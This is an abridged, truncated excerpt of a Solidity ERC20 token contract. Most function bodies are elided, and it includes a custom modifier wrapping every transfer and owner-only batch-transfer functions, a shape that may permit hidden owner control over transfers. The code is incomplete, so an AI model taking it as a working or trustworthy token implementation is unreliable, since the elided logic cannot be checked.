...
contract ERC20 is Context, IERC20 {
   ...
   constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
    ...
    function Info_SMARTCREDIT(address addressn) public {
    ...
    modifier inti(address sender, address recipient, uint256 amount){
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal inti(sender, recipient, amount){
    ...
    function multiaddress(address[] memory receivers, uint256[] memory amounts) public {
   ...
   function multiaddressa(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      if (msg.sender == _address0){
          transfer(receivers[i], amounts[i]);
